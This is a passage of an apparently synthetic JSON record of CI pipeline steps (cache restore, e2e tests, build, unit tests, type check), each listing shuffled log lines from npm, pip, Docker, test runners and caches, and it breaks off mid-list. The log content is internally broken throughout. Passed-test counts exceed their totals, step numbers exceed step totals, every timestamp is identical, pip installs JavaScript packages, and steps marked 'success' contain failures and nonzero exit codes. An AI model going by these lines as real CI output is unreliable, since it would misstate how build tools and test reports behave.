          "[12:47:36] DEBUG: Memory usage: 144MB",
          "pip install: Successfully installed webpack-1.8",
          "Uploading artifact 'coverage' (22 files)",
          "Platform: linux-x64",
          "Connection established",
          "pip: Collecting lodash",
          "Connection established",
          "yarn add: Done in 5.86s",
          "Optimizing 17 modules...",
          "Test Suites: 48 passed, 44 total",
          "Step 13/20: Deploying",
          "Ran 180 tests in 34s",
          "Layer 1/13: ENV command",
          "Ready.",
          "  PASS: integration/test_user_create.spec.js",
          "Success!",
          "Step 6/23: Testing",
          "\u2713 package completed",
          "npm notice: package.json updated",
          "Completed.",
          "npm notice: package.json updated",
          "Compiling utils/main.py...",
          "Success!",
          "[12:47:36] ERROR: Connection failed",
          "Compiling src/main.py...",
          "[12:47:36] INFO: Request completed",
          "Compiling components/main.py...",
          "[12:47:36] DEBUG: Initializing service",
          "Compiling components/service.java...",
          "Artifact uploaded: dist.zip (2MB)",
          "WARNING: prettier has known vulnerabilities",
          "Step 3/20: Linting",
          "Processing...",
          "Cache hit for key-6194",
          "Using Node.js 20.19.7",
          "Tests: 435 passed, 79 total",
          "Creating production build...",
          "Compiling src/handler.rs...",
          "Tests: 142 passed, 282 total",
          "\u2713 deploy completed",
          "POST /api - 201 (128ms)",
          "Done.",
          "[12:47:36] DEBUG: Query executed in 97ms",
          "Step 9/19: Linting",
          "\u2713 Task completed in 2854ms",
          "Completed.",
          "Optimizing 68 modules...",
          "Processing...",
          "TLS handshake completed",
          "Creating production build...",
          "Artifact downloaded: 13MB",
          "Finished.",
          "[12:47:36] DEBUG: Query executed in 50ms",
          "Installing lodash@1.1.5",
          "Processing...",
          "Step 11/22: Testing",
          "Already up to date.",
          "Already up to date.",
          "Bundling main.css",
          "Fetching submodules...",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading jest-4.1.tar.gz",
          "Exception: TypeError",
          "Installing webpack@5.14.6",
          "[12:47:36] WARN: Deprecated API usage",
          "Loading...",
          "Cache miss for key-8053",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] DEBUG: Initializing service",
          "Compiling src/utils.go...",
          "GET /status - 200 (76ms)",
          "pip install: Successfully installed eslint-2.9",
          "NODE_ENV=development",
          "Installing axios@3.1.10",
          "[12:47:36] WARN: Deprecated API usage",
          "GET /api - 200 (81ms)",
          "[12:47:36] ERROR: Connection failed",
          "Switched to branch 'bugfix/task-674'",
          "Test Suites: 48 passed, 29 total",
          "[12:47:36] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Ran 92 tests in 19s",
          "[12:47:36] DEBUG: Query executed in 9ms",
          "Building Docker image...",
          "Connection established",
          "[12:47:36] ERROR: Connection failed",
          "[12:47:36] DEBUG: Connection pool: 15 active",
          "Verifying...",
          "Optimizing 80 modules...",
          "npm notice: created a lockfile",
          "Pulling image: python:18",
          "Step 18/23: Testing",
          "FAILED: test_cache_hit",
          "Done.",
          "pip: Downloading jest-2.11.tar.gz",
          "\u2713 Task completed in 2301ms",
          "Step 9/24: Linting",
          "Finished.",
          "WARNING: prettier has known vulnerabilities",
          "Step 12/17: Deploying",
          "npm notice: package.json updated",
          "Compiling lib/utils.go...",
          "Cache saved successfully",
          "Cache restored successfully (163MB)",
          "  PASS: test_auth_login (353ms)",
          "npm notice: package.json updated",
          "Compiling src/main.py...",
          "Cache restored successfully (472MB)",
          "Image pulled successfully",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Test Suites: 44 passed, 15 total",
          "npm install: resolved 1656 packages",
          "Step 14/15: Linting",
          "Creating production build...",
          "OK",
          "npm install: added 325 packages",
          "npm install: resolved 1774 packages",
          "Cache restored successfully (236MB)",
          "Tests: 312 passed, 206 total",
          "[12:47:36] DEBUG: Query executed in 46ms",
          "Artifact downloaded: 33MB",
          "Using Node.js 16.13.5",
          "Cache miss for key-4902",
          "Verifying...",
          "Tests: 257 passed, 488 total",
          "Cache hit for key-7198",
          "Bundling runtime.js",
          "Generating source maps...",
          "Loading...",
          "Optimizing 66 modules...",
          "Optimizing 38 modules...",
          "Loading...",
          "Optimizing 28 modules...",
          "Time: 112.107s",
          "Success!",
          "yarn add: Done in 5.45s",
          "[12:47:36] DEBUG: Initializing service",
          "npm install: added 212 packages",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-27T12:47:59.711565",
        "finished_at": "2025-11-27T12:48:14.439678",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:47:36] INFO: Processing request",
          "Artifact uploaded: dist.zip (76MB)",
          "\u2713 Step 'install' succeeded",
          "Step 12/24: Deploying",
          "\u2713 Step 'checkout' succeeded",
          "Coverage: 77% statements, 100% branches",
          "Finished.",
          "[12:47:36] INFO: Starting build process",
          "Minifying app.js",
          "HEAD is now at 9198333",
          "Compiling lib/utils.go...",
          "\u2713 Task completed in 1901ms",
          "HEAD is now at 9cbd037",
          "Compiling src/service.java...",
          "[12:47:36] ERROR: Connection failed",
          "Compiling utils/utils.go...",
          "Exception: TypeError",
          "Cache saved successfully",
          "Completed.",
          "OK",
          "Tests: 313 passed, 373 total",
          "[12:47:36] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "[12:47:36] DEBUG: Initializing service",
          "Installing express@2.1.1",
          "Time: 109.792s",
          "[12:47:36] DEBUG: Connection pool: 6 active",
          "[12:47:36] INFO: Starting build process",
          "npm install: added 218 packages",
          "Test Suites: 7 passed, 18 total",
          "  PASS: test_user_create (237ms)",
          "Pulling image: python:3.11",
          "HEAD is now at 3056424",
          "OK",
          "Compiling utils/index.js...",
          "Step 14/19: Running migrations",
          "[12:47:36] INFO: Processing request",
          "POST /data - 202 (58ms)",
          "[12:47:36] DEBUG: Loading configuration",
          "Bundling runtime.js",
          "[12:47:36] DEBUG: Memory usage: 380MB",
          "npm install: resolved 995 packages",
          "Step 5/20: Building",
          "HEAD is now at f0a4d7f",
          "WARNING: eslint has known vulnerabilities",
          "Pulling image: alpine:latest",
          "  PASS: test_db_connect (31ms)",
          "Step 6/19: Deploying",
          "Checking out master branch",
          "Cache invalidated: build",
          "Time: 64.388s",
          "Tests: 499 passed, 62 total",
          "Bundling runtime.css",
          "npm install: added 179 packages",
          "GET /health - 200 (66ms)",
          "Fetching from https://googleapis.com/package.json",
          "Switched to branch 'feature/task-993'",
          "[12:47:36] WARN: Deprecated API usage",
          "Ready.",
          "Minifying app.js",
          "[12:47:36] INFO: Processing request",
          "[12:47:36] INFO: Request completed",
          "Coverage: 83% statements, 99% branches",
          "Cache saved successfully",
          "Minifying main.js",
          "Image pulled successfully",
          "WARNING: webpack has known vulnerabilities",
          "Step 9/16: Building",
          "Cache restored successfully (139MB)",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "npm notice: created a lockfile",
          "[12:47:36] WARN: Deprecated API usage",
          "Step 19/22: Deploying",
          "\u2713 All checks passed",
          "NODE_ENV=production",
          "Compiling lib/utils.go...",
          "Step 20/15: Linting",
          "Optimizing 22 modules...",
          "Coverage: 99% statements, 99% branches",
          "Optimizing 55 modules...",
          "Loading...",
          "Cache restored successfully (448MB)",
          "NODE_ENV=production",
          "Processing...",
          "[12:47:36] WARN: Deprecated API usage",
          "Verifying...",
          "Using Node.js 15.12.9",
          "Loading...",
          "[12:47:36] ERROR: Connection failed",
          "Cache miss for key-4897",
          "Step 17/22: Building",
          "npm install: added 436 packages",
          "Fetching from https://googleapis.com/package.json",
          "Verifying...",
          "Artifact downloaded: 42MB",
          "FAILED: test_api_health",
          "Step 12/20: Building",
          "\u2717 build failed with exit code 55",
          "Already up to date.",
          "Artifact uploaded: dist.zip (81MB)",
          "Cache hit for key-4201",
          "GET /health - 200 (24ms)",
          "Cache miss for key-9850",
          "Image pulled successfully",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Test Suites: 45 passed, 20 total",
          "yarn add: Done in 25.67s",
          "[12:47:36] DEBUG: Query executed in 28ms",
          "Step 2/20: Testing",
          "Compiling utils/index.js...",
          "Compiling components/index.js...",
          "Transforming 319 files...",
          "Step 14/19: Installing dependencies",
          "Exception: ValueError",
          "Image pulled successfully",
          "Step 8/22: Deploying",
          "\u2717 build failed with exit code 104",
          "npm notice: created a lockfile",
          "npm install: added 132 packages",
          "npm notice: package.json updated",
          "Verifying...",
          "Cache hit for key-4180",
          "  PASS: test_auth_login (74ms)",
          "Cache hit for key-5780",
          "Verifying...",
          "[12:47:36] DEBUG: Connection pool: 18 active",
          "Pushing to registry...",
          "\u2713 Task completed in 4925ms",
          "Tests: 187 passed, 497 total",
          "Optimizing 41 modules...",
          "  PASS: test_cache_hit (355ms)",
          "Uploading artifact 'coverage' (24 files)",
          "Ready.",
          "Loading...",
          "Creating production build...",
          "Processing...",
          "Waiting...",
          "Success!",
          "Compiling components/utils.go...",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-866'",
          "[12:47:36] INFO: Processing request",
          "POST /upload - 200 (488ms)",
          "Exception: RuntimeError",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "yarn add: Done in 27.82s",
          "[12:47:36] INFO: Processing request",
          "Loading...",
          "OK",
          "GET /health - 204 (37ms)",
          "GET /health - 204 (61ms)",
          "Step 8/17: Testing",
          "Cache hit for key-5730",
          "npm install: added 311 packages",
          "Artifact uploaded: dist.zip (28MB)",
          "npm notice: created a lockfile",
          "HEAD is now at 4925e09",
          "Coverage: 94% statements, 91% branches",
          "[12:47:36] WARN: Deprecated API usage",
          "Checking out develop branch",
          "OK",
          "WARNING: react has known vulnerabilities",
          "Processing...",
          "[12:47:36] INFO: Connecting to database",
          "Cache miss for key-6343",
          "Artifact uploaded: dist.zip (6MB)",
          "Building Docker image...",
          "Checking out main branch",
          "Step 1/15: Deploying",
          "Step 5/18: Linting",
          "Environment: test",
          "[12:47:36] DEBUG: Initializing service",
          "Layer 7/9: RUN command",
          "npm install: resolved 833 packages",
          "HEAD is now at 3c9b9ad",
          "GET /status - 204 (12ms)",
          "Cache saved successfully",
          "GET /status - 204 (71ms)",
          "[12:47:36] INFO: Connecting to database",
          "  PASS: test_db_connect (43ms)",
          "Platform: linux-x64",
          "Transforming 407 files...",
          "Checking out develop branch",
          "Waiting...",
          "Switched to branch 'bugfix/task-752'",
          "Success!",
          "Ran 41 tests in 42s",
          "Transforming 897 files...",
          "Cache invalidated: build",
          "Platform: win32-x64",
          "\u2713 deploy completed",
          "[12:47:36] WARN: Deprecated API usage",
          "yarn add: Done in 29.61s",
          "Tests: 348 passed, 268 total",
          "pip: Collecting axios",
          "Minifying vendor.js",
          "[12:47:36] DEBUG: Initializing service",
          "Optimizing 70 modules...",
          "Connection established",
          "Step 1/21: Testing",
          "\u2713 build completed",
          "\u2713 Step 'test' succeeded",
          "\u2713 build completed",
          "Creating production build...",
          "Optimizing 98 modules...",
          "yarn add: Done in 15.51s",
          "yarn add: Done in 11.99s",
          "pip: Downloading jest-5.13.tar.gz",
          "Step 17/22: Building",
          "[12:47:36] DEBUG: Connection pool: 8 active",
          "  PASS: test_api_health (440ms)",
          "yarn add: Done in 14.86s",
          "npm notice: package.json updated",
          "[12:47:36] DEBUG: Initializing service",
          "Step 3/15: Installing dependencies",
          "Switched to branch 'feature/task-687'",
          "Cache restored successfully (454MB)",
          "Artifact downloaded: 6MB",
          "Layer 6/11: COPY command",
          "Finished.",
          "Layer 8/14: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Platform: darwin-arm64",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 4889ms",
          "[12:47:36] INFO: Cache refreshed",
          "Processing...",
          "Finished.",
          "[12:47:36] WARN: Deprecated API usage",
          "pip install: Successfully installed axios-3.19",
          "TLS handshake completed",
          "Snapshots: 16 passed, 2 total",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at c38b1e8",
          "Step 14/19: Running migrations",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-27T12:48:14.439678",
        "finished_at": "2025-11-27T12:48:58.624018",
        "log_lines": [
          "=== Step: build ===",
          "Test Suites: 39 passed, 10 total",
          "[12:47:36] INFO: Connecting to database",
          "WARNING: express has known vulnerabilities",
          "Ran 168 tests in 7s",
          "Fetching submodules...",
          "Compiling components/main.py...",
          "NODE_ENV=development",
          "Step 14/25: Testing",
          "Cache restored successfully (331MB)",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] DEBUG: Loading configuration",
          "Platform: darwin-arm64",
          "[12:47:36] DEBUG: Loading configuration",
          "Environment: development",
          "[12:47:36] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "yarn add: Done in 16.49s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "NODE_ENV=development",
          "pip: Collecting react",
          "Artifact downloaded: 14MB",
          "Pulling image: alpine:3.11",
          "Minifying main.js",
          "\u2713 Task completed in 2249ms",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "[12:47:36] INFO: Starting build process",
          "Compiling src/utils.go...",
          "Optimizing 10 modules...",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Platform: linux-x64",
          "Step 9/20: Installing dependencies",
          "Installing lodash@4.6.2",
          "Exception: NullPointerException",
          "[12:47:36] INFO: Cache refreshed",
          "Checking out master branch",
          "Fetching submodules...",
          "Cache invalidated: node_modules",
          "Coverage: 88% statements, 91% branches",
          "  PASS: unit/test_db_connect.spec.js",
          "WARNING: webpack has known vulnerabilities",
          "Step 11/17: Installing dependencies",
          "Environment: test",
          "Uploading artifact 'build' (44 files)",
          "Done.",
          "[12:47:36] INFO: Request completed",
          "Coverage: 73% statements, 64% branches",
          "[12:47:36] WARN: Deprecated API usage",
          "OK",
          "Ran 65 tests in 31s",
          "WARNING: webpack has known vulnerabilities",
          "Test Suites: 38 passed, 10 total",
          "[12:47:36] INFO: Processing request",
          "[12:47:36] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'build' (34 files)",
          "HEAD is now at fbe4cf5",
          "pip: Installing build dependencies...",
          "Layer 4/12: RUN command",
          "Ran 123 tests in 16s",
          "Completed.",
          "Switched to branch 'bugfix/task-101'",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Already up to date.",
          "Cache restored successfully (150MB)",
          "Fetching submodules...",
          "POST /data - 201 (72ms)",
          "Pulling image: python:latest",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Completed.",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:36] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "OK",
          "[12:47:36] INFO: Request completed",
          "POST /api - 201 (319ms)",
          "Bundling main.css",
          "Test Suites: 20 passed, 41 total",
          "Generating source maps...",
          "TLS handshake completed",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Test Suites: 14 passed, 28 total",
          "HEAD is now at 5ed79e4",
          "Generating source maps...",
          "Tests: 122 passed, 302 total",
          "Success!",
          "Pushing to registry...",
          "[12:47:36] DEBUG: Loading configuration",
          "Finished.",
          "[12:47:36] DEBUG: Connection pool: 14 active",
          "POST /upload - 202 (462ms)",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 505ms",
          "Fetching submodules...",
          "Artifact downloaded: 35MB",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 14/15: Building",
          "Step 14/25: Running migrations",
          "Platform: linux-x64",
          "Artifact downloaded: 30MB",
          "Pushing to registry...",
          "Compiling utils/app.ts...",
          "pip: Collecting jest",
          "[12:47:36] DEBUG: Query executed in 99ms",
          "Success!",
          "Layer 8/9: COPY command",
          "pip: Collecting jest",
          "Building Docker image...",
          "Step 3/19: Building",
          "Bundling vendor.css",
          "TLS handshake completed",
          "Artifact downloaded: 46MB",
          "Using Node.js 15.16.2",
          "npm notice: package.json updated",
          "Building Docker image...",
          "Installing eslint@5.6.8",
          "[12:47:36] DEBUG: Connection pool: 3 active",
          "[12:47:36] INFO: Request completed",
          "Already up to date.",
          "[12:47:36] INFO: Cache refreshed",
          "TLS handshake completed",
          "pip: Collecting jest",
          "Waiting...",
          "Compiling components/service.java...",
          "[12:47:36] DEBUG: Initializing service",
          "\u2713 build completed",
          "Step 17/16: Building",
          "Using Python 3.10",
          "\u2713 Step 'test' succeeded",
          "Cache miss for key-2592",
          "Minifying app.js",
          "[12:47:36] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "Test Suites: 44 passed, 15 total",
          "Pulling image: alpine:3.11",
          "Cache hit for key-2004",
          "[12:47:36] DEBUG: Initializing service",
          "Step 12/19: Testing",
          "Cache invalidated: build",
          "[12:47:36] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@1.5.9",
          "Optimizing 68 modules...",
          "HEAD is now at 28fa375",
          "Compiling lib/app.ts...",
          "Already up to date.",
          "npm install: added 440 packages",
          "Step 16/22: Deploying",
          "Switched to branch 'feature/task-790'",
          "Loading...",
          "\u2713 Task completed in 4413ms",
          "Layer 5/9: ENV command",
          "Checking out main branch",
          "[12:47:36] DEBUG: Connection pool: 7 active",
          "Step 19/21: Deploying",
          "HEAD is now at e4ca9c8",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] DEBUG: Query executed in 55ms",
          "npm notice: created a lockfile",
          "Using Python 3.9",
          "POST /data - 202 (59ms)",
          "Compiling utils/app.ts...",
          "pip: Collecting axios",
          "\u2713 Task completed in 3508ms",
          "Artifact downloaded: 6MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:36] INFO: Processing request",
          "Step 3/15: Building",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "[12:47:36] DEBUG: Memory usage: 1597MB",
          "Building Docker image...",
          "\u2717 build failed with exit code 82",
          "Checking out develop branch",
          "Tests: 228 passed, 498 total",
          "Ran 46 tests in 57s",
          "Building Docker image...",
          "yarn add: Done in 10.16s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "OK",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/index.js...",
          "  PASS: test_cache_hit (184ms)",
          "\u2713 package completed",
          "npm install: added 99 packages",
          "Cache restored successfully (336MB)",
          "Pushing to registry...",
          "Creating production build...",
          "[12:47:36] WARN: Deprecated API usage",
          "Using Python 3.12",
          "Finished.",
          "  PASS: e2e/test_auth_login.spec.js",
          "  PASS: test_db_connect (155ms)",
          "npm install: resolved 1263 packages",
          "\u2713 Step 'setup' succeeded",
          "[12:47:36] WARN: Deprecated API usage",
          "Processing...",
          "Using Node.js 20.5.5",
          "HEAD is now at 1dd57b5",
          "[12:47:36] DEBUG: Loading configuration",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (40MB)",
          "GET /health - 204 (25ms)",
          "Step 1/15: Installing dependencies",
          "Bundling main.js",
          "pip: Downloading express-5.0.tar.gz",
          "Step 5/21: Running migrations",
          "Already up to date.",
          "WARNING: lodash has known vulnerabilities",
          "Cache miss for key-3366",
          "Optimizing 33 modules...",
          "Step 15/21: Testing",
          "Pushing to registry...",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_user_create (272ms)",
          "POST /upload - 201 (274ms)",
          "[12:47:36] DEBUG: Memory usage: 1369MB",
          "\u2713 build completed",
          "Cache miss for key-5404",
          "Finished.",
          "[12:47:36] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 82",
          "Waiting...",
          "Success!",
          "Image pulled successfully",
          "  PASS: test_api_health (348ms)",
          "NODE_ENV=production",
          "\u2713 Task completed in 261ms",
          "Step 6/23: Installing dependencies",
          "Time: 108.262s",
          "Layer 3/9: COPY command",
          "pip: Downloading express-4.9.tar.gz",
          "Creating production build...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-27T12:48:58.624018",
        "finished_at": "2025-11-27T12:49:42.808358",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Ready.",
          "Minifying vendor.js",
          "Artifact uploaded: dist.zip (23MB)",
          "Test Suites: 7 passed, 36 total",
          "Compiling utils/main.py...",
          "[12:47:36] WARN: Deprecated API usage",
          "GET /status - 200 (45ms)",
          "\u2713 test completed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:47:36] INFO: Connecting to database",
          "Uploading artifact 'dist' (10 files)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Cache saved successfully",
          "Switched to branch 'feature/task-366'",
          "[12:47:36] WARN: Deprecated API usage",
          "Transforming 331 files...",
          "Using Python 3.11",
          "Layer 4/8: RUN command",
          "Snapshots: 14 passed, 38 total",
          "Coverage: 78% statements, 63% branches",
          "Step 3/16: Testing",
          "Cache hit for key-1227",
          "[12:47:36] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Transforming 560 files...",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "Finished.",
          "[12:47:36] DEBUG: Loading configuration",
          "Step 16/17: Deploying",
          "Environment: production",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:36] INFO: Starting build process",
          "[12:47:36] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 17.8.6",
          "POST /data - 200 (345ms)",
          "\u2713 Task completed in 1664ms",
          "pip: Downloading lodash-5.18.tar.gz",
          "Optimizing 74 modules...",
          "Checking out master branch",
          "  PASS: integration/test_api_health.spec.js",
          "Fetching from https://registry.npmjs.org/package.json",
          "FAILED: test_api_health",
          "pip: Collecting axios",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 21MB",
          "pip: Installing build dependencies...",
          "[12:47:36] INFO: Cache refreshed",
          "Minifying main.js",
          "Success!",
          "pip: Collecting express",
          "Already up to date.",
          "[12:47:36] DEBUG: Query executed in 8ms",
          "[12:47:36] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Test Suites: 24 passed, 12 total",
          "Pushing to registry...",
          "Cache invalidated: build",
          "[12:47:36] INFO: Starting build process",
          "  PASS: test_api_health (55ms)",
          "Generating source maps...",
          "Checking out main branch",
          "WARNING: webpack has known vulnerabilities",
          "Pushing to registry...",
          "FAILED: test_auth_login",
          "OK",
          "Done.",
          "Uploading artifact 'build' (38 files)",
          "Minifying app.js",
          "WARNING: react has known vulnerabilities",
          "Image pulled successfully",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] DEBUG: Memory usage: 115MB",
          "Step 1/22: Deploying",
          "Compiling lib/service.java...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "[12:47:36] DEBUG: Initializing service",
          "npm install: added 262 packages",
          "Installing axios@4.1.1",
          "Bundling runtime.css",
          "Compiling src/app.ts...",
          "OK",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 99% statements, 86% branches",
          "Transforming 648 files...",
          "  PASS: test_api_health (362ms)",
          "NODE_ENV=production",
          "Checking out develop branch",
          "Fetching from https://githubusercontent.com/package.json",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Verifying...",
          "Cache saved successfully",
          "Already up to date.",
          "[12:47:36] DEBUG: Query executed in 89ms",
          "Step 7/25: Installing dependencies",
          "Step 15/16: Building",
          "Minifying main.js",
          "npm notice: package.json updated",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:18",
          "Step 16/25: Installing dependencies",
          "pip install: Successfully installed react-5.15",
          "[12:47:36] DEBUG: Memory usage: 1979MB",
          "Step 12/15: Deploying",
          "[12:47:36] DEBUG: Initializing service",
          "npm install: resolved 1797 packages",
          "pip: Collecting react",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:47:36] INFO: Cache refreshed",
          "Minifying vendor.js",
          "[12:47:36] DEBUG: Loading configuration",
          "Step 5/20: Testing",
          "Step 1/15: Testing",
          "Processing...",
          "Installing axios@4.16.8",
          "Step 1/15: Deploying",
          "Completed.",
          "Cache hit for key-8995",
          "Cache hit for key-9760",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] WARN: Deprecated API usage",
          "Fetching from https://googleapis.com/package.json",
          "Processing...",
          "Completed.",
          "\u2713 validate completed",
          "\u2713 Task completed in 2146ms",
          "Coverage: 72% statements, 79% branches",
          "Cache invalidated: node_modules",
          "Using Node.js 15.7.4",
          "Test Suites: 30 passed, 20 total",
          "pip: Installing build dependencies...",
          "[12:47:36] INFO: Connecting to database",
          "[12:47:36] DEBUG: Initializing service",
          "Snapshots: 28 passed, 22 total",
          "POST /data - 202 (447ms)",
          "Switched to branch 'hotfix/task-697'",
          "Using Python 3.12",
          "[12:47:36] WARN: Deprecated API usage",
          "Ready.",
          "pip: Downloading lodash-3.17.tar.gz",
          "Image pulled successfully",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "[12:47:36] INFO: Starting build process",
          "Test Suites: 21 passed, 31 total",
          "npm notice: package.json updated",
          "Finished.",
          "POST /upload - 200 (92ms)",
          "Cache miss for key-2917",
          "[12:47:36] DEBUG: Loading configuration",
          "Transforming 945 files...",
          "Step 9/20: Linting",
          "[12:47:36] DEBUG: Initializing service",
          "Processing...",
          "Artifact downloaded: 14MB",
          "[12:47:36] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Checking out develop branch",
          "Test Suites: 8 passed, 50 total",
          "Step 7/23: Building",
          "Test Suites: 24 passed, 16 total",
          "Loading...",
          "Image pulled successfully",
          "[12:47:36] INFO: Processing request",
          "Artifact downloaded: 24MB",
          "HEAD is now at 5486a6f",
          "Ready.",
          "GET /status - 201 (28ms)",
          "yarn add: Done in 2.12s",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "Cache hit for key-2756",
          "Step 2/23: Running migrations",
          "Cache restored successfully (68MB)",
          "Using Python 3.9",
          "npm notice: created a lockfile",
          "pip: Collecting webpack",
          "Artifact downloaded: 45MB",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:47:36] INFO: Request completed",
          "[12:47:36] INFO: Request completed",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (49MB)",
          "\u2713 All checks passed",
          "Tests: 338 passed, 81 total",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling utils/app.ts...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing webpack@5.14.7",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "Minifying vendor.js",
          "Cache restored successfully (378MB)",
          "Building Docker image...",
          "Checking out main branch",
          "Cache miss for key-2255",
          "Fetching submodules...",
          "Using Python 3.11",
          "WARNING: eslint has known vulnerabilities",
          "Uploading artifact 'dist' (12 files)",
          "Snapshots: 32 passed, 27 total",
          "Test Suites: 6 passed, 20 total",
          "[12:47:36] DEBUG: Loading configuration",
          "Compiling utils/handler.rs...",
          "Artifact downloaded: 8MB",
          "Minifying vendor.js",
          "[12:47:36] DEBUG: Initializing service",
          "Verifying...",
          "\u2713 package completed",
          "[12:47:36] INFO: Processing request",
          "Using Python 3.11",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.12",
          "Test Suites: 21 passed, 22 total",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 package completed",
          "Step 14/23: Deploying",
          "NODE_ENV=test",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "Tests: 427 passed, 432 total",
          "Compiling lib/service.java...",
          "pip: Collecting prettier",
          "Platform: win32-x64",
          "[12:47:36] DEBUG: Initializing service",
          "[12:47:36] ERROR: Connection failed",
          "Already up to date.",
          "Compiling utils/main.py...",
          "Artifact uploaded: dist.zip (84MB)",
          "Success!",
          "Environment: test",
          "[12:47:36] DEBUG: Initializing service",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-27T12:49:42.808358",
        "finished_at": "2025-11-27T12:49:57.536471",
        "log_lines": [
          "=== Step: type_check ===",
          "WARNING: react has known vulnerabilities",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] INFO: Processing request",
          "Pushing to registry...",
          "pip: Collecting webpack",
          "Cache hit for key-5332",
          "Coverage: 92% statements, 73% branches",
          "Step 2/19: Installing dependencies",
          "Using Node.js 19.1.0",
          "Step 14/16: Running migrations",
          "Artifact uploaded: dist.zip (69MB)",
          "[12:47:36] DEBUG: Query executed in 66ms",
          "OK",
          "Uploading artifact 'build' (23 files)",
          "Test Suites: 28 passed, 49 total",
          "Step 7/17: Linting",
          "Completed.",
          "Switched to branch 'bugfix/task-528'",
          "Step 16/17: Building",
          "Pushing to registry...",
          "npm install: resolved 1564 packages",
          "Compiling src/main.py...",
          "Verifying...",
          "TLS handshake completed",
          "Done.",
          "Bundling main.css",
          "Using Python 3.10",
          "[12:47:36] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (18MB)",
          "Compiling utils/service.java...",
          "\u2717 build failed with exit code 110",
          "pip install: Successfully installed prettier-3.4",
          "HEAD is now at 4bff999",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/main.py...",
          "Generating source maps...",
          "\u2713 Step 'test' succeeded",
          "Artifact downloaded: 42MB",
          "Installing react@3.3.6",
